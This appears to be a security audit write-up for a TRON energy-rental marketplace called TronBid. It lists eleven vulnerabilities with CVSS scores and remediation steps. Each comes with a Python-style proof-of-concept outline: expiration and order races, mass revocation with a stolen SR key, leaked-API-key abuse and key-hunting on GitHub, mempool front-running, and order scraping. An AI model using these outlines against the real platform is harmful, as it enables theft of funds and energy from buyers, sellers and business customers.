# TronBid: Detailed Attack Vectors & PoC Outlines

## HIGH-SEVERITY VULNERABILITIES

### 1. Energy Expiration Race Condition (CVSS 7.5)

**Root Cause:** TRON delegations expire at fixed block heights. If buyer's transaction executes after expiration, TRX burn fallback occurs instead of consuming delegated energy.

**Attack Outline:**
```python
# Step 1: Monitor delegation expiration via TRONSCAN API
expiration_block = get_delegation_info(order_id)["expiration_block"]

# Step 2: Calculate submission timing
current_block = get_latest_block()
blocks_until_expiration = expiration_block - current_block
# Typically 3-5 blocks (~15-25 seconds before expiration)

# Step 3: Craft transaction for exact expiration moment
transaction = {
    "to": "TRC20_USDT_address",
    "data": "transfer_function_call",
    "energy_limit": 65000,  # Rental was for 65k energy
}

# Step 4: Submit when blocks_until_expiration == 1
# Transaction enters mempool but confirms AFTER delegation expires

# Step 5: Measure actual energy vs TRX burned
actual_energy_used = check_tx_receipt(tx_hash)["energy_used"]
trx_burned = check_trx_balance_change(buyer_address)

# Expected: 0 TRX burned, 65k energy consumed
# Actual (if successful): 50-100 TRX burned, 0 energy consumed
```

**Remediation Proof:**
1. Extend delegation 5 minutes past rental window
2. Verify transaction executes with delegated energy + grace period
3. Confirm no TRX burned

---

### 2. Payment Without Delegation (CVSS 7.8)

**Root Cause:** API processes payment confirmation and delegation as separate transactions. If delegation fails after payment, no automatic refund.

**Attack Outline:**
```python
# Scenario: Seller unstakes TRX between payment and delegation

# Step 1: Create order, monitor payment address
order_response = api.create_order({
    "target_address": buyer_addr,
    "energy_amount": 65000,
    "rental_duration": 30,  # minutes
})
pay_address = order_response["pay_address"]

# Step 2: Send TRX to pay address
tx_hash = send_trx(pay_address, amount=32.5)  # ~0.5 TRX per 1000 energy
payment_confirmed = wait_confirmation(tx_hash, confirmations=19)

# Step 3: API should trigger delegation
# Check delegation state after 10 seconds
delegation_status = api.get_order(order_response["order_id"])["status"]

# Expected: "DELEGATED" or "ACTIVE"
# Actual (if seller unstaked): "FAILED" or no state update
# Payment already confirmed on-chain; TRX not returned

# Step 4: Verify funds are stuck
balance_after = get_trx_balance(pay_address)
# Expected: 0 (delegated or returned)
# Actual: 32.5 TRX stuck; no automatic refund

# Step 5: Check if refund endpoint exists
try:
    refund_response = api.request_refund(order_id)
    print(f"Refund available: {refund_response}")
except:
    print("No refund mechanism; funds locked")
```

**Remediation Proof:**
1. Implement atomic payment-delegation or multi-sig escrow
2. Verify failed delegations trigger automatic refund
3. Check refund processing within 30 seconds

---

### 3. SR Account Compromise (CVSS 8.1)

**Root Cause:** TronBid's SR Partner account (`TGcwj4sP1iiSwMrMEPmDw43J1V3CehK7rM`) holds delegation authority for all energy. If private key is compromised, attacker gains control.

**Attack Outline:**
```python
# Step 1: Assume attacker has SR private key (phishing, GitHub leak, etc.)
sr_address = "TGcwj4sP1iiSwMrMEPmDw43J1V3CehK7rM"
sr_private_key = "0x..." # COMPROMISED

# Step 2: Query all active delegations via TRONSCAN
active_delegations = query_delegations(sr_address)
total_energy = sum([d["energy_amount"] for d in active_delegations])
# Result: 791M+ energy currently delegated to 395+ buyer addresses

# Step 3: Craft mass-revocation attack
for delegation in active_delegations:
    undelegate_tx = build_undelegate(
        delegator=sr_address,
        recipient=delegation["buyer_address"],
        resource_type="ENERGY",
    )
    # Sign with compromised key
    tx_signed = sign_tx(undelegate_tx, sr_private_key)
    # Broadcast all simultaneously
    broadcast_tx(tx_signed)

# Step 4: Verify mass revocation
time.sleep(60)  # Wait for block confirmation
delegations_after = query_delegations(sr_address)
# Expected (attack success): 0 delegations
# Result: All 791M+ energy units instantly return to sellers
# All 395+ buyers now have 0 energy; next transaction burns TRX

# Step 5: Attacker delegates energy to self
attacker_address = "T..."
for seller_stake in all_seller_stakes:
    delegate_tx = build_delegate(
        delegator=seller_stake["address"],  # Forged with compromised key
        recipient=attacker_address,
        resource_type="ENERGY",
        amount=seller_stake["energy_amount"],
    )
    tx_signed = sign_tx(delegate_tx, sr_private_key)
    broadcast_tx(tx_signed)

# Step 6: Attacker extracts value
# All 791M+ energy now delegated to attacker
# Attacker performs unlimited USDT transfers without cost
# Attacker converts to profit on DEX or cash out
```

**Remediation Proof:**
1. Verify SR account uses hardware wallet or multisig (2-of-3 or 3-of-5)
2. Confirm no private keys in version control or config files
3. Monitor unusual delegation activity via TRONSCAN alerts
4. Require emergency pause contract for governance override

---

### 4. B2B API Key Abuse (CVSS 8.0)

**Root Cause:** B2B API keys lack spending caps and rate limiting. Leaked key allows unlimited order submission.

**Attack Outline:**
```python
# Step 1: Obtain leaked B2B API key (GitHub, config file, etc.)
api_key = "tronbid_b2b_sk_live_..." # LEAKED

# Step 2: Set up bulk order script
def spam_orders(api_key, iterations=10000):
    for i in range(iterations):
        order = api.create_order(
            api_key=api_key,
            target_address="T...",  # Attacker's address
            energy_amount=65000,
            rental_duration=30,
            idempotency_key=f"spam_{i}",  # Unique key to bypass dedup
        )
        print(f"Order {i}: {order['order_id']}")
        
        # Send TRX to pay address immediately
        tx = send_trx(order["pay_address"], amount=32.5)
        
        # Rate: ~1 order per second = 10k orders in ~3 hours

# Step 3: Execute spam attack
spam_orders(api_key, iterations=10000)

# Step 4: Monitor impact
customer_account = api.get_account(api_key)
print(f"Balance: {customer_account['balance']} TRX")
# Expected: Negative or depleted

# Step 5: Verify no spending cap rejected orders
rejected_count = api.get_order_stats(api_key)["rejected_orders"]
# Expected (with spending caps): ~50 rejected
# Actual (without spending caps): 0 rejected; all 10k processed

# Result: Attacker drained customer's account
# Customer's legitimate orders now fail due to insufficient balance
# B2B customer loses revenue during peak demand hours
```

**Remediation Proof:**
1. Implement per-minute (e.g., 100 TRX/min), per-hour (1000 TRX/hr), per-day caps
2. Verify rate limiting via concurrent requests (simulate 100 simultaneous orders)
3. Check API returns 429 (Too Many Requests) or 402 (Payment Required) after limit
4. Confirm API key can be revoked/rotated manually

---

### 5. API Key Leakage & Unauthorized Orders (CVSS 7.9)

**Root Cause:** API authentication via Bearer token. If token is leaked (GitHub, client-side hardcoding, intercepted), attacker can impersonate user.

**Attack Outline:**
```python
# Step 1: Find leaked API key
# - Search GitHub for "tronbid" + "sk_live" + "bearer"
# - Intercept from mobile app traffic (Burp Suite)
# - Phish user for key

leaked_key = "tronbid_seller_sk_live_abc123def456"

# Step 2: Query seller's account via stolen key
seller_account = api.get_account(bearer_token=leaked_key)
print(f"Account balance: {seller_account['balance']}")
print(f"Active energy: {seller_account['available_energy']}")
print(f"Seller address: {seller_account['seller_address']}")

# Step 3: Accept unauthorized orders on behalf of seller
attacker_buyer = "T_attacker_address"

# Create order with attacker as buyer (will be approved automatically)
order_acceptance = api.accept_order(
    bearer_token=leaked_key,
    order_id="vulnerable_buyer_order_123",
    buyer_address=attacker_buyer,  # Swap in attacker address
)

# Step 4: Delegation executed under seller's account
# Attacker receives energy; seller's energy balance decremented
# But attacker never sends payment

# Step 5: Attacker extracts value
# Use delegated energy for free USDT transfers
# Convert to profit

# Step 6: Seller discovers missing energy but no payment received
seller_receives_alert = api.get_notifications(bearer_token=leaked_key)
# Alert: "Order fulfilled but buyer never paid"
# Or worse: No alert; seller only notices when energy balance is empty
```

**Remediation Proof:**
1. Scan GitHub for "tronbid" + API key patterns (regex: `sk_(live|test)_[a-zA-Z0-9]{32}`)
2. Check if leaked keys work (attempt unauthorized order)
3. Verify API returns 401/403 for revoked keys
4. Confirm key rotation removes access immediately

---

## MEDIUM-SEVERITY VULNERABILITIES

### 6. Delegated Energy Revocation (CVSS 6.8)

**Mechanism:** Seller can undelegate energy even after buyer pays and energy is delegated.

**Quick PoC:**
```python
# After buyer pays and receives delegation
buyer_address = "T_buyer"
seller_address = "T_seller"

# Seller immediately calls UnDelegateResource
undelegate_tx = {
    "from": seller_address,
    "to": "TRON_contract",
    "function": "UnDelegateResource",
    "params": {
        "recipient": buyer_address,
        "resource": "ENERGY",
    }
}

# Before buyer's transaction confirms
buyer_tx = {
    "to": "USDT_contract",
    "data": "transfer 1000 USDT",  # Uses ~32k energy
}

# Timeline:
# T+0s:   Buyer sends payment
# T+2s:   Seller delegates energy to buyer
# T+3s:   Seller calls UnDelegateResource
# T+5s:   Buyer submits USDT transfer expecting delegated energy
# Result: Energy expired; TRX burned instead

# Verify outcome
buyer_balance = get_trx_balance(buyer_address)
# Lost: 32.5 TRX payment + TRX burn fee
# Gained: 0 energy
```

---

### 7. Cross-Order Energy Reuse (CVSS 6.5)

**Mechanism:** TRON allows stacking delegations. Buyer can receive 2x energy but only pay 1x.

**Quick PoC:**
```python
# Buyer creates 2 orders simultaneously
order_1 = api.create_order(energy=65000, duration=30, price=0.5)
order_2 = api.create_order(energy=65000, duration=30, price=0.5)

# Pay for both (32.5 TRX each)
send_trx(order_1["pay_address"], 32.5)
send_trx(order_2["pay_address"], 32.5)

# Both delegations now active to buyer_address
# Total delegated: 130,000 energy

# Buyer submits 2 USDT transfers (~32.5k energy each)
for i in range(2):
    tx = send_usdt(1000, energy_limit=32500)

# If order tracking is independent per order:
# Order 1 records: 32.5k energy used
# Order 2 records: 32.5k energy used
# Actual delegation allows 130k energy
# Double spending not detected if pool is tracked separately

# If order tracking is cumulative per buyer:
# System detects 65k energy used against 130k delegated
# No double spend
# Requires verification of implementation
```

---

### 8. Order Matching Race Condition (CVSS 6.8)

**Mechanism:** Two sellers accept same order simultaneously before state locks.

**Quick PoC:**
```python
import concurrent.futures

order_id = "buy_65000_energy_30min"

def accept_order(seller_id):
    result = api.accept_order(order_id=order_id, seller_id=seller_id)
    return result

# Two sellers attempt to accept same order
with concurrent.futures.ThreadPoolExecutor(max_workers=2) as executor:
    future_seller_a = executor.submit(accept_order, "seller_a")
    future_seller_b = executor.submit(accept_order, "seller_b")
    
    result_a = future_seller_a.result()
    result_b = future_seller_b.result()

# Expected: Only one seller gets the order
# Actual (if race vulnerable): Both sellers see order as accepted
# Both delegate energy; buyer gets 2x
# Or one seller is orphaned (no payment confirmation)

print(f"Seller A result: {result_a.get('status')}")  # "ACCEPTED"?
print(f"Seller B result: {result_b.get('status')}")  # "ACCEPTED"? or "CONFLICT"?
```

---

### 9. Flash Recharge Atomicity (CVSS 6.7)

**Mechanism:** If recharge is async/batched, buyer's transaction might execute before recharge completes.

**Quick PoC:**
```python
# Monitor API batch processing
# Time API response to recharge request
start = time.time()
response = api.flash_recharge(energy=131000)
elapsed = time.time() - start

# Expected: <1 second (synchronous)
# Actual: 5-10 seconds (batched processing)

# If batched, exploit timing window:
# T+0s:   Submit Flash Recharge order
# T+1s:   Submit USDT transfer (before recharge batch processes)
# T+5s:   Recharge batch finally executes
# Result: Transfer executed with insufficient energy; TRX burned

# Verify by checking transaction timestamps vs recharge confirmation
```

---

### 10. Quick Rent Price Manipulation (CVSS 6.5)

**Mechanism:** Fixed-price orders can be front-run if order placement is observable.

**Quick PoC:**
```python
# Monitor mempool for buyer's create_order transaction
buyer_pending_tx = monitor_mempool()["create_order"]
buyer_order = parse_order_data(buyer_pending_tx)
# Buyer wants: 65k energy at 0.5 TRX/1000 = 32.5 TRX

# Before buyer's TX confirms, seller submits high price order
seller_high_price_order = api.create_order(
    energy=65000,
    price_per_1k_energy=2.0,  # 4x price
)

# If order matching prioritizes price-worst (instead of price-best),
# buyer's order matches seller's high-price order instead of cheaper alternatives

# Verify:
matched_order = api.get_order(buyer_order_id)
actual_price = matched_order["price_per_1k_energy"]
# Expected: 0.5 TRX/1k
# Actual (if vulnerable): 2.0 TRX/1k
# Buyer pays 4x expected cost
```

---

## LOW-SEVERITY VULNERABILITIES

### 11. B2B Order Enumeration (CVSS 3.7)

**Mechanism:** API allows querying all orders without pagination limits, enabling competitor scraping.

**Quick PoC:**
```python
# Fetch all orders without rate limiting
for page in range(1, 100000):
    orders = api.get_all_orders(page=page)
    if not orders:
        break
    
    for order in orders:
        print(f"Price: {order['price']}, Volume: {order['volume']}")
        # Competitor scrapes pricing data, discovers TronBid's algorithm
        
# Attacker builds model: when is energy expensive? when is it cheap?
# Use model to time personal orders for best prices
```

**Remediation:** Add rate limiting (e.g., 10 requests/min) and pagination limits (e.g., max 1000 results).

---

## Summary Table

| # | Vulnerability | CVSS | Root Cause | PoC Time | Impact |
|---|---|---|---|---|---|
| 1 | Energy Expiration Race | 7.5 | Timing edge case | 2h | TRX burn instead of delegation |
| 2 | Payment Without Delegation | 7.8 | Async state | 1h | Funds locked, no refund |
| 3 | SR Account Compromise | 8.1 | Key exposure | N/A | Total marketplace drain |
| 4 | B2B API Abuse | 8.0 | No spending caps | 1h | Customer account drained |
| 5 | API Key Leakage | 7.9 | Weak auth | 1h | Unauthorized orders |
| 6 | Energy Revocation | 6.8 | No atomicity | 30m | Seller grief attack |
| 7 | Energy Reuse | 6.5 | Pool tracking | 1h | Double spending |
| 8 | Order Race | 6.8 | Concurrency bug | 2h | Overbilling |
| 9 | Flash Recharge | 6.7 | Async batching | 1.5h | TRX burn on recharge |
| 10 | Price Manipulation | 6.5 | Front-running | 1.5h | 4x overpayment |
| 11 | Order Enumeration | 3.7 | No rate limit | 30m | Competitor intel |

